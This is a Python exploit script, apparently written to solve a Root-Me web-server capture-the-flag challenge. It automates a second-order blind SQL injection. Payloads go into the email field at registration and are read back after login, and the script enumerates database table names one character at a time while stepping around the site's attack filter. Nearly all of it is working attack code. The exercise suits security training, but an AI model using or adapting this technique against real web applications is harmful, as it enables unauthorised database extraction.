#!/usr/bin/python

import os
import re
import sys
import time

def urlencode(s):
	ignoreList = list('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_*()')
	acc = ''
	for c in s:
		if c in ignoreList:
			acc += c
		else:
			acc += '%' + hex(ord(c))[2:]
	return acc

class User:
	charList='abcdefghijklmnopqrstuvwxyz'
	def __init__(self, defaultName=''):
		if defaultName != '':
			self.name = defaultName
			self.currentChar = User.charList.index(self.name[-1])
		else:
			self.name = User.charList[0]
			self.currentChar = 0

	def __repr__(self):
		return (self.name)

	def __str__(self):
		return self.name

	def next(self):
		i = 1
		self.name = list(self.name)
		while i <= len(self.name):
			self.name[-i] = User.charList[(User.charList.index(self.name[-i]) + 1) % len(User.charList)]
			if self.name[-i] == User.charList[0]:
				if i == len(self.name):
					self.name = [User.charList[0]] + self.name
					break
				i += 1
			else:
				break
		self.name = ''.join(self.name)

registerPage = "http://challenge01.root-me.org/web-serveur/ch33/?action=register"
loginPage = "http://challenge01.root-me.org/web-serveur/ch33/?action=login"
user = User('bqiq')

def get_results(e):
	email = urlencode(e)
	request = "curl -s {0} -d 'username={1}&password=a&email={2}'".format(registerPage,user,email)
	s = os.popen(request).read()
	if 'attack' in s:
		return 'attack detected'
	while 'user exist' in s.lower():
		user.next()
		sys.stdout.flush()
		request = "curl -s {0} -d 'username={1}&password=a&email={2}'".format(registerPage,user,email)
		s = os.popen(request).read()
		if 'attack' in s:
			return 'attack detected'
	print(user)
	request = "curl -s {0} -d 'username={1}&password=a'".format(loginPage,user)
	s = os.popen(request).read()
	return s
	
# Get number of tables
print('Getting number of tables')
tableFilter = 'WHERE 1=1'

tables = ['CHARACTER_SETS', 'COLLATIONS', 'COLLATION_CHARACTER_SET_APPLICABILITY',
'COLUMNS', 'COLUMN_PRIVILEGES', 'ENGINES',
'EVENTS', 'FILES', 'KEY_COLUMN_USAGE',
'GLOBAL_VARIABLES', 'GLOBAL_STATUS', 'PARAMETERS',
'PARTITIONS', 'PLUGINS', 'PROCESSLIST',
'PROFILING', 'REFERENTIAL_CONSTRAINTS', 'ROUTINES',
'SCHEMATA', 'SCHEMA_PRIVILEGES', 'SESSION_STATUS',
'SESSION_VARIABLES', 'STATISTICS', 'TABLES',
'TABLESPACES', 'TABLE_CONSTRAINTS', 'TABLE_PRIVILEGES',
'TRIGGERS', 'USER_PRIVILEGES', 'VIEWS',
'INNODB_BUFFER_PAGE', 'INNODB_TRX', 'INNODB_BUFFER_POOL_STATS',
'INNODB_LOCK_WAITS', 'INNODB_CMPMEM', 'INNODB_CMP',
'INNODB_LOCKS', 'INNODB_CMPMEM_RESET', 'INNODB_CMP_RESET',
'INNODB_BUFFER_PAGE_LRU', 'FLAG', 'MEMBRES']

for tbl in tables:
	tableFilter += " AND table_name<>'{0}'".format(tbl)

email = "' + (SELECT COUNT(*) FROM information_schema.tables {0}) + '".format(tableFilter)
s = get_results(email)
tableCount = int(re.match('(.*\n)*.*Email : (\d+).*', s).group(2))
print('Total number of tables: {0}'.format(tableCount))

t = 0
while t < tableCount:
	# Get length of table_name
	print('Getting length of table_name')
	email = "' + LENGTH((SELECT table_name FROM information_schema.tables {0} LIMIT 1)) + '".format(tableFilter)
	user.next()
	s = get_results(email)
	table_name_len = int(re.match('(.*\n)*.*Email : (\d+).*', s).group(2))
	print('Table name length: {0}'.format(table_name_len))

	# Get table_name
	print('Getting table name')
	i = 0
	tableName = ''
	while i < table_name_len:
		print(i, table_name_len, tableName)
		c = 32
		while c < 127:
			if chr(c) in "'\\":
				c += 1
				continue

			email = "' or '{0}' < (SELECT table_name FROM information_schema.tables {1} LIMIT 1) or '".format(tableName+chr(c), tableFilter)
			print(email)
			user.next()
			s = get_results(email)
			if s == 'attack detected':
				c += 1
				continue
			m = re.match('(.*\n)*.*Email : (\d+).*', s)
			if not m:
				print(s)
				continue
			result = m.group(2)

			if result == '1':
				c += 1
				time.sleep(0.3)
			elif result == '0':
				if i < table_name_len - 1:
					tableName += chr(c-1)
				else:
					tableName += chr(c)
				time.sleep(0.5)
				break
		i += 1
	tableFilter += " AND table_name<>'{0}'".format(tableName)
	tables.append(tableName)
	t += 1

for tbl in tables:
	print(tbl)

print(user)
